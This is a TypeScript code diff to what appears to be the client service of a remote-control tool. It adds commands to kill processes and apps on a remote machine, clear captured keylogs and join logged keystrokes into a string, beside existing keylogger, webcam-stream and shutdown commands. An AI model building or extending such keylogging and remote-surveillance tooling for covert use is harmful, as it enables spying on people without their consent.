@@ -115,7 +115,13 @@ sendProcessStart() {
     payload: { path: exe }
   });
 }
-
+killProcess(pid: number) {
+  this.ws.sendJson({
+    module: "PROCESS",
+    command: "KILL",
+    pid: pid
+  });
+}
   // SYSTEM
   sendSystemShutdown() {
     this.ws.sendJson({ module: "SYSTEM", command: "SHUTDOWN" });
@@ -155,6 +161,13 @@ sendProcessStart() {
     payload: { path: name }
   });
 }
+killApp(name: string) {
+  this.ws.sendJson({
+    module: "APP",
+    command: "KILL",
+    payload: { name: name }
+  });
+}
   // KEYLOGGER
   sendKeyloggerStart() {
     this.ws.sendJson({ module: "KEYBOARD", command: "START" });
@@ -167,6 +180,15 @@ sendProcessStart() {
   sendKeyloggerGetLog() {
     this.ws.sendJson({ module: "KEYBOARD", command: "GET_LOG" });
   }
+clearKeylogs() {
+  this.ws.keylogList.set([]);  // Xóa toàn bộ log trong signal
+}
+keylogString = computed(() => {
+  return this.keylogEntries().map(k => k.text).join("");
+});
+
+
+
 
   // WEBCAM
   sendWebcamStartStream() {
